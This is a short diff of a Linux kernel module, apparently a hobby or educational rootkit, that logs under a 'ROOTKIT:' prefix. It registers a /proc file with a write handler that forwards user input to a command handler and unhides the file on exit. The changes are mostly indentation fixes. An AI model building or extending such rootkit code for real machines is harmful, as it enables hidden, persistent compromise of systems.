@@ -87,18 +87,16 @@ void handle_request(const char __user* buff, size_t len){
 }
 
 static ssize_t write_proc(struct file* f, const char __user* buff, size_t len, loff_t* off){
-    printk(KERN_INFO "ROOTKIT: Hi from write_proc\n");
+	printk(KERN_INFO "ROOTKIT: Hi from write_proc\n");
 
 	// I don't know if this should be handled here
 	handle_request(buff, len);
 
-    //copy_from_user(orden, buff, len);
-    //printk(KERN_INFO "ROOTKIT: write_proc %s\n", orden);
-    return len;
+	return len;
 }
 
 static struct file_operations proc_fops = {
-    .write = write_proc
+	.write = write_proc
 };
 
 int __init proc_init(void){
@@ -116,5 +114,5 @@ int __init proc_init(void){
 
 void __exit proc_exit(void){
 	unhide_file(PROC_FILENAME);
-    remove_proc_entry(PROC_FILENAME, NULL);
+	remove_proc_entry(PROC_FILENAME, NULL);
 }
